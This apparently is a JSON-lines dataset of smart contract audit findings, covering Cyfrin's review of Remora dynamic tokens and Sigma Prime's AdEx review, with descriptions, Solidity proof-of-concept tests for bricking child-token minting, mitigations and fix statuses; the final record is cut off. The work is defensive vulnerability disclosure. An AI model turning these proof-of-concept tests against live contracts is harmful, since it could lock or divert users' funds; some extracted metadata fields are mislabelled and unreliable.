{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-018", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 18, "page_start": null, "title": "Admin could use `CentralToken::transferFrom` after approval to break 1:1 invariant in child token", "short_summary": null, "description_md": null, "full_markdown": "### Admin could use `CentralToken::transferFrom` after approval to break 1:1 invariant in child token\n\n**Description:** Function `transfer` contains `_checkAllowedAdmin(to)` which prevents an admin (accidentally or otherwise) sending a `CentralToken` to a `ChildToken` directly.\n\n```solidity\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        if (amount == 0) return true;\n        _checkAllowedAdmin(to);\n        return super.transfer(to, amount);\n    }\n```\n\nHowever, `transferFrom` is not overridden so it is possible for an admin to:\n- `approve` the `CentralToken` contract\n- call `transferFrom(address(this), childToken, amount)` (for some `childToken` and `amount`)\n\nThis will immediately brick the `ChildToken` contract from minting since `mint` contains this check:\n\n```solidity\nfunction mint(address to, uint256 amount) external whenNotPaused {\n...\n        if(ICentralToken(cToken).balanceOf(address(this)) != totalSupply() + amount)\n            revert CentralBalanceInvariant();\n```\n\n**Impact:** An admin's transfer can permanently disabled `CentralToken::dynamicTransfer` being called when it would send tokens to the `ChildToken` with the broken invariant.\n\nFurther, the directly-transferred token could not be recovered using `ChildToken::burn` since it never had a `ChildToken` minted for it.\n\n**Proof of Concept:** Add this test to `CentralTokenTest.t.sol`\n\n```solidity\nfunction test_cyfrin_brickMintingInChildToken() public {\n    address dom = getDomesticUser(0);\n    centralTokenProxy.mint(address(this), uint64(4));\n\n    // send 1 token to the child contract directly, after approving\n    centralTokenProxy.approve(address(this), type(uint256).max);\n    centralTokenProxy.transferFrom(address(this), address(d_childTokenProxy), 1);\n\n    vm.expectRevert(bytes4(keccak256(\"CentralBalanceInvariant()\")));\n    centralTokenProxy.dynamicTransfer(dom, 3);\n}\n```\n\n**Recommended Mitigation:**\n1. Override `transferFrom` with the following definition\n\n```solidity\nfunction transferFrom(address from, address to, uint256 amount) public override returns (bool) {\n    if (amount == 0) return true;\n    _checkAllowedAdmin(to);\n    return super.transferFrom(from, to, amount);\n}\n```\n\n2. It may also be worth disabling the `approve` function if it is not strictly needed\n\n3. It may also be worth updating `Allowlist.addUser` to check whether a user's address is a contract, or if you want to allow contracts, checking that it doesn't satisfy the interface of `ChildToken`\n\n**Remora:** Fixed at commit [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484).\n\n**Cyfrin:** Verified. `transfer()` and `transferFrom()` are overridden, and a validation was added to prevent the recipient from being a ChildToken.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-019", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 19, "page_start": null, "title": "Consider explicitly denying `allowUser` assigning admin privileges to`ChildToken` contracts", "short_summary": null, "description_md": null, "full_markdown": "### Consider explicitly denying `allowUser` assigning admin privileges to`ChildToken` contracts\n\n**Description:** The 1:1 invariant of a child token can be broken as follows:\n\nAdmin:\n- calls `allowUser` on a child token contract\n- calls `transfer` to directly send central token to the child token\n\nThis breaks the 1:1 invariant.\n\nThis is clearly something only a malicious admin would do, so this has been classified as Informational.\n\n**Impact:** 1:1 invariant of child token is broken, bricking any further minting.\n\n**Proof of Concept:** Add this to `CentralTokenTest.t.sol`\n\n```solidity\n    function test_cyfrin_brickMintingByAllowingChildTokenAsAdmin() public {\n        address dom = getDomesticUser(0);\n        centralTokenProxy.mint(address(this), uint64(4));\n\n        allowListProxy.allowUser(address(d_childTokenProxy), true, true, true);\n        centralTokenProxy.transfer(address(d_childTokenProxy), 1);\n\n\n        vm.expectRevert(bytes4(keccak256(\"CentralBalanceInvariant()\")));\n        centralTokenProxy.dynamicTransfer(dom, 3);\n    }\n```\n**Remora:** Fixed at commit [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484).\n\n**Cyfrin:** Verified. `transfer()` and `transferFrom()` are overridden preventing ChildTokens from receiving CentralTokens via a direct transfer or transferFrom.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-020", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 20, "page_start": null, "title": "Logic of `FiveFiftyRule::checkCanTransfer` and `FiveFiftyRule::canTransfer` can subtle differ", "short_summary": null, "description_md": null, "full_markdown": "### Logic of `FiveFiftyRule::checkCanTransfer` and `FiveFiftyRule::canTransfer` can subtle differ\n\n**Description:** There are subtle differences in the `checkCanTransfer` and `canTransfer` functions on the `FiveFiftyRule` contract that could make the result of the execution on both of them differ.\nThe most notable difference is shown on the snippet below:\n1. On `canTransfer`, it considers the `gid` on the conditional\n2. On `checkCanTransfer`, it doesn't consider the `gid` on the conditional\n\n```solidity\n//FiveFiftyRule.sol//\n    function canTransfer(address from, address to, uint256 amount) external returns (bool) {\n        ...\n\n        // to side changes\n        if (to != address(0)) {\n            ...\n            } else if (gId == 0 && iTo.numCatalyst != 0 &&\n                !_updateEntityAllowance(false, to, amount)\n            ) revert();\n\n            ...\n        }\n\n        ...\n    }\n\nfunction checkCanTransfer(\n    address to,\n    uint256 amount\n) external view returns (bool _output) {\n    ...\n    } else if (iData.numCatalyst != 0 &&\n        !_checkEntityAllowance(to, amount)\n    ) return false;\n\n    ...\n}\n\n```\n\n**Recommended Mitigation:** Consider making them have the same logic by factoring out common logic into internal functions.\n\n**Remora:** Acknowledged.\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-021", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 21, "page_start": null, "title": "`TokenBank::setCustodian` should ensure custodian has ADMIN privileges", "short_summary": null, "description_md": null, "full_markdown": "### `TokenBank::setCustodian` should ensure custodian has ADMIN privileges\n\n**Description:** If the `TokenBank::setCustodian` is called and they don't have ADMIN privileges then `TokenBank::removeToken` will revert since the call to `safeTransfer` will indirectly call `CentralToken.transfer` which has this implementation:\n\n```solidity\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        if (amount == 0) return true;\n        _checkAllowedAdmin(to);\n        return super.transfer(to, amount);\n    }\n```\n\n**Impact:** Minimal since admin can always just call `setCustodian` again or give ADMIN privileges to the custodian.\n\n**Recommended Mitigation:** Add one line to `setCustodian`\n\n```solidity\nrequire(allowlist.allowed(newCustodian) && allowlist.isAdmin(newCustodian),\n        \"Custodian must be allowlist admin\");\n```\n\n**Remora:** Fixed at commit [a3ae706](https://github.com/remora-projects/remora-dynamic-tokens/commit/a3ae70627dbeb55ac5f9bfeb6ab4a4512703c6c8)\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-022", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 22, "page_start": null, "title": "Extra validation on `CentralToken::addChildToken` will prevent adding incorrect `ChildToken`", "short_summary": null, "description_md": null, "full_markdown": "### Extra validation on `CentralToken::addChildToken` will prevent adding incorrect `ChildToken`\n\n**Description:** Currently, it is possible to:\n- Create a `childToken0` which sets `centralToken0` as its parent\n- For a different central call `centralToken1::addChildToken(centralToken0)`\n\n**Recommended Mitigation:** To prevent this mismatch the following extra validation is recommended:\n\n```diff\n+  error ChildTokenNotChildOfThis();\n```\n\n```diff\n  interface IChildRWAToken {\n+     function centralToken() external view returns (address);\n      function domestic() external view returns (bool);\n      function distributePayout(uint128 amount) external;\n      function mint(address to, uint256 amount) external;\n      function balanceOf(address account) external view returns (uint256);\n      function toggleBurning(bool newState) external;\n      function togglePause(bool newState) external;\n}\n```\n\n```diff\n    function addChildToken(\n        address tokenAddress\n    ) external nonReentrant restricted {\n        if (tokenAddress == address(0) || tokenAddress.code.length == 0)\n            revert InvalidAddress();\n\n+       if (IChildRWAToken(tokenAddress).centralToken() != address(this)) revert ChildTokenNotChildOfThis();\n        // 0 for domestic, 1 for foreign\n        bool isDomestic = IChildRWAToken(tokenAddress).domestic();\n        uint256 childIndex = isDomestic ? 0 : 1;\n\n\n        if (childTokens[childIndex] != address(0)) revert ChildTokenAlreadyExists();\n        childTokens[uint256(childIndex)] = tokenAddress;\n\n        emit ChildTokenAdded(tokenAddress, isDomestic);\n    }\n```\n\n**Remora:** Fixed at commit [846851a](https://github.com/remora-projects/remora-dynamic-tokens/commit/846851ae7f691ed77d235185584ac0fb82b43e77).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-023", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 23, "page_start": null, "title": "Consider using struct instead of an array for the domestic and foreign child tokens", "short_summary": null, "description_md": null, "full_markdown": "### Consider using struct instead of an array for the domestic and foreign child tokens\n\n**Description:** The `CentralToken` code could probably be simplified by using the following data structure for child tokens.\n\n\n```solidity\n    struct Children {\n        address domestic;\n        address foreign;\n    }\n\n    Children private children;\n```\n\nThis should lead to greater code clarity. Currently one has to remember that 0 = domestic and 1 = foreign.\n\nThis helper function could then be used wherever you currently iterate over the children to retain convenience.\n\n```solidity\n    function _forEachChild(function(address) internal fn) internal {\n        address a = children.domestic; if (a != address(0)) fn(a);\n        a = children.foreign;  if (a != address(0)) fn(a);\n    }\n```\n\n\n**Remora:** Fixed at commit [f753fac](https://github.com/remora-projects/remora-dynamic-tokens/commit/f753faca15ce9bfdcda3ed690c65aba410a22f37).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_adex_review-001", "doc_id": "sigmaprime_adex_review", "finding_index": 1, "page_start": 7, "title": "Tokens Can Be Locked if Channel Creators Lose Their Keys", "short_summary": null, "description_md": "In the event that a channel becomes stale and cannot update/progress its state (for example, the *supermajority* cannot be reached, or more than <sup>1</sup> 3 lose their keys or fail to participate) the tokens can only be withdrawn once the channel expires. In such an event, only the channel creator can withdraw the original deposited tokens.\n\nIt can be the case that a creator creates a channel and disposes or loses the related private key over time, not expecting to have to withdraw the channel's tokens. In this scenario, tokens are lost forever in the AdExCore contract.\n\nThis is simply an informational point and may be the intentional design of the related smart contract.\n", "full_markdown": "| ADX-01 | Tokens Can Be Locked if Channel Creators Lose Their Keys |\n|--------|----------------------------------------------------------|\n| Asset  | AdExCore.sol                                             |\n| Status | Closed: See Resolution                                   |\n| Rating | Informational                                            |\n\nIn the event that a channel becomes stale and cannot update/progress its state (for example, the *supermajority* cannot be reached, or more than <sup>1</sup> 3 lose their keys or fail to participate) the tokens can only be withdrawn once the channel expires. In such an event, only the channel creator can withdraw the original deposited tokens.\n\nIt can be the case that a creator creates a channel and disposes or loses the related private key over time, not expecting to have to withdraw the channel's tokens. In this scenario, tokens are lost forever in the AdExCore contract.\n\nThis is simply an informational point and may be the intentional design of the related smart contract.\n\n#### **Recommendations**\n\nA safety mechanism could be easily implemented which allows anyone to withdraw lost tokens using a timeoutbased approach. For example, on line [**55**] the require could be modified as follows:\n\n```\nrequire ( msg . sender == channel . creator || now > channel . validUntil + 1 year );\n```\n\n## **Resolution**\n\nThe development team acknowledges this issue, see below response:\n\n*\"After review, we decided to pass on implementing the recommendation, since it constitutes unintuitive behavior for us; the recommendation would allow anyone to claim the tokens after a period; in terms of decision making, this is the same debate as whether lost coins should be \"recycled\" from bitcoin/ethereum. In our protocol papers, we mention that using an arbitor validator is a helpful, since if one of them loses the keys, the channel can still be drained\".*\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "ADX-01", "target": {"path": "channel creator", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/AdExNetwork/adex-protocol-eth", "org": "AdExNetwork", "name": "adex-protocol-eth", "commit": "98c65a3e05262638e3ff2da28b873b7f7ca44982", "branch": null, "relative_file": "channel creator", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:04:48.733506+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:48.735249+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Asset": "AdExCore.sol", "Status": "Closed: See Resolution", "Rating": "Informational", "Finding ID": "ADX-01", "Target": "channel creator"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_adex_review-002", "doc_id": "sigmaprime_adex_review", "finding_index": 2, "page_start": 8, "title": "Publishers Unable to Withdraw from Fast Expiring Channels", "short_summary": null, "description_md": "The AdEx Protocol documentation states [\\[2\\]](#page-14-2), *\"OUTPACE channel should have 2-3 times as long of a duration, in order to allow extra time for publishers to withdraw their revenue.\"*\n\nHowever, in the current core implementation, there is no minimum time requirement for each channel's validUntil duration. Thus, publishers have to rely on the *Market* (a RESTful service) to compute and communicate all time constraints. This Market layer cannot be entirely trusted.\n\nAssuming the time interval is erroneously communicated to publishers, or simply not accounted for by publishers, there exists a realistic edge case where channels expire before publishers are able to withdraw earned revenues.\n\nSimilarly, a malicious advertiser can also create a channel with a small active time window, with just enough time for publishers to confirm a bid, but not enough time to allow payment withdrawal. After the channel expires, the advertiser is able to withdraw the remaining balance without paying publishers.\n", "full_markdown": "| ADX-02 | Publishers Unable to Withdraw from Fast Expiring Channels |\n|--------|-----------------------------------------------------------|\n| Asset  | ChannelLibrary.sol                                        |\n| Status | Closed: See Resolution                                    |\n| Rating | Informational                                             |\n\nThe AdEx Protocol documentation states [\\[2\\]](#page-14-2), *\"OUTPACE channel should have 2-3 times as long of a duration, in order to allow extra time for publishers to withdraw their revenue.\"*\n\nHowever, in the current core implementation, there is no minimum time requirement for each channel's validUntil duration. Thus, publishers have to rely on the *Market* (a RESTful service) to compute and communicate all time constraints. This Market layer cannot be entirely trusted.\n\nAssuming the time interval is erroneously communicated to publishers, or simply not accounted for by publishers, there exists a realistic edge case where channels expire before publishers are able to withdraw earned revenues.\n\nSimilarly, a malicious advertiser can also create a channel with a small active time window, with just enough time for publishers to confirm a bid, but not enough time to allow payment withdrawal. After the channel expires, the advertiser is able to withdraw the remaining balance without paying publishers.\n\n#### **Recommendations**\n\nAdEx acknowledges this potential **stuck revenue** problem. The current implementation suggests publishers will reliably check for expiration times off-chain and will account for this potential issue.\n\nAnother recommendation is to impose a reasonable MIN\\_VALIDITY time interval (as a constant in ChannelLibrary ) for each channel upon channel creation. This constant could be used to restrict channels to have minimum lengths.\n\n#### **Resolution**\n\nThe development team acknowledges this issue, see below response:\n\n*\"Again, we consider this to be a defined behavior, although we will consider implementing the recommendation of a minimum channel duration. However, as with many things in the AdEx ecosystem (token used, who are the validators) this is one of the things that will be governed on-chain: short lived channels would be excluded/filtered\".*\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "ADX-02", "target": {"path": "Publishers Unable to Withdraw from Fast Expiring Channels", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/AdExNetwork/adex-protocol-eth", "org": "AdExNetwork", "name": "adex-protocol-eth", "commit": "98c65a3e05262638e3ff2da28b873b7f7ca44982", "branch": null, "relative_file": "Publishers Unable to Withdraw from Fast Expiring Channels", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:04:48.733506+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:48.735249+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Asset": "ChannelLibrary.sol", "Status": "Closed: See Resolution", "Rating": "Informational", "Finding ID": "ADX-02", "Target": "Publishers Unable to Withdraw from Fast Expiring Channels"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_adex_review-003", "doc_id": "sigmaprime_adex_review", "finding_index": 3, "page_start": 9, "title": "Inadequate and Misleading On-chain Channel State", "short_summary": null, "description_md": "The AdEx Protocol documentation specifies that [\\[2\\]](#page-14-2): *\"the market needs to track all on-chain OUTPACE channels and needs to constantly monitor their liveness (>=2/3 validators online and producing new states) and state.\"*.\n\nFurthermore, the AdexCore maintains a public states mapping that signals whether channels are Unknown , Active , or Expired .\n\nCurrent design and implementation seem to permit clumsy providers or market-builders to mistake states for a reliable source of channel *state*. It is possible that users will rely on the getChannelState getter function to read this information on-chain and see if the channel has expired.\n\nThis is problematic since the states mapping does not accurately describe the latest actual channel state. For example, the only way for a channel state to become Expired is if the advertiser withdraws their balance upon channel expiry. Expired channels, whose advertisers have not yet withdrawn, will show up as Active in the related on-chain states .\n", "full_markdown": "| ADX-03 | Inadequate and Misleading On-chain Channel State |\n|--------|--------------------------------------------------|\n| Asset  | ChannelLibrary.sol                               |\n| Status | Closed: See Resolution                           |\n| Rating | Informational                                    |\n\nThe AdEx Protocol documentation specifies that [\\[2\\]](#page-14-2): *\"the market needs to track all on-chain OUTPACE channels and needs to constantly monitor their liveness (>=2/3 validators online and producing new states) and state.\"*.\n\nFurthermore, the AdexCore maintains a public states mapping that signals whether channels are Unknown , Active , or Expired .\n\nCurrent design and implementation seem to permit clumsy providers or market-builders to mistake states for a reliable source of channel *state*. It is possible that users will rely on the getChannelState getter function to read this information on-chain and see if the channel has expired.\n\nThis is problematic since the states mapping does not accurately describe the latest actual channel state. For example, the only way for a channel state to become Expired is if the advertiser withdraws their balance upon channel expiry. Expired channels, whose advertisers have not yet withdrawn, will show up as Active in the related on-chain states .\n\n#### **Recommendations**\n\nA getter function could be implemented, which would leverage the isValid() function on Active states with the current blocktime to return a more accurate description of whether a channel's state is truly active and valid.\n\n#### **Resolution**\n\nThe development team acknowledges this issue, see below response:\n\n*\"We acknowledge this issue and it's a very good point, however we think it's an issue of naming. There is a separate system to track the overall channel state (the validator stack), which is also aware of campaign health and whether all funds in the channel are distributed (Exchausted state) that takes care of that. Our internal recommendation would be to rename the state getter\".*\n", "severity": "Medium", "difficulty": "Low", "type": null, "finding_id": "ADX-03", "target": {"path": "Channel state tracking system", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/AdExNetwork/adex-protocol-eth", "org": "AdExNetwork", "name": "adex-protocol-eth", "commit": "98c65a3e05262638e3ff2da28b873b7f7ca44982", "branch": null, "relative_file": "Channel state tracking system", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:04:48.733506+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:48.735249+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "Low", "Asset": "ChannelLibrary.sol", "Status": "Closed: See Resolution", "Rating": "Informational", "Finding ID": "ADX-03", "Target": "Channel state tracking system"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_adex_review-004", "doc_id": "sigmaprime_adex_review", "finding_index": 4, "page_start": 10, "title": "Miscellanenous Comments and Gas Optimisation Suggestions", "short_summary": null, "description_md": "This section outlines miscellaneous comments and suggestions that were found as a by-product of this review. We include this section as it may be useful for the authors to improve readability of the code.\n\n- **Gas Saving** In ChannelLibrary.sol on lines [**9**] and [**10**], a uint8 is used. The EVM prefers type sizes of 32 bits (i.e. uint256 ). In order to read/write smaller types the EVM uses masks which costs more gas. Setting these to uint types will reduce computation and save gas. ✓ Resolved in commit [\\[da725ba\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/da725ba15a77712cd8b5d175097114432d920174)\n- **Gas Saving For-loop Convention** In MerkleProof.sol line [8], the for-loop terminates when i!=proof.length . It may be better to terminate the for-loop as of i < proof.length for better readability. This would also save gas, as the EVM takes one additional opcode to perform a \"not equals\" check than it takes to perform a \"less than\" check. ✓ Resolved in commit [\\[46a8e48\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/46a8e48ec2817e1b0f6b333a0f075d8a318e6761)\n- **Gas Saving Public Functions** In AdExCore.sol , the following functions can be declared external instead of public to save gas: channelOpen , channelWithdraw and channelWithdrawExpired .\n- **Comment Inaccuracy** In MerkleProof.sol line [7], developer comment notes the future need to *\"compare valueHash == root if the proof is empty?\"*. This is not necessary as this base case is already handled by the function. A merkle tree with only 1 leaf uses the leaf as the root itself. ✓ Resolved in commit [\\[caa872c\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/caa872ce982cd09a342b42d10281bf82038e6070)\n- **Comment Inaccuracy** In SafeERC20.sol line [10], developer comment suggests the checkSuccess() function is *\"definitely not a pure fn but the compiler complains otherwise\"*. This function is indeed a pure function as the assembly doesn't include any impure opcode (see a non-exhaustive list [\\[3\\]](#page-14-3)). ✓ Resolved in commit [\\[caa872c\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/caa872ce982cd09a342b42d10281bf82038e6070)\n", "full_markdown": "| ADX-04 | Miscellanenous Comments and Gas Optimisation Suggestions |\n|--------|----------------------------------------------------------|\n| Asset  | All Contracts in Scope                                   |\n| Status | Resolved: See inline comments and Resolution             |\n| Rating | Informational                                            |\n\nThis section outlines miscellaneous comments and suggestions that were found as a by-product of this review. We include this section as it may be useful for the authors to improve readability of the code.\n\n- **Gas Saving** In ChannelLibrary.sol on lines [**9**] and [**10**], a uint8 is used. The EVM prefers type sizes of 32 bits (i.e. uint256 ). In order to read/write smaller types the EVM uses masks which costs more gas. Setting these to uint types will reduce computation and save gas. ✓ Resolved in commit [\\[da725ba\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/da725ba15a77712cd8b5d175097114432d920174)\n- **Gas Saving For-loop Convention** In MerkleProof.sol line [8], the for-loop terminates when i!=proof.length . It may be better to terminate the for-loop as of i < proof.length for better readability. This would also save gas, as the EVM takes one additional opcode to perform a \"not equals\" 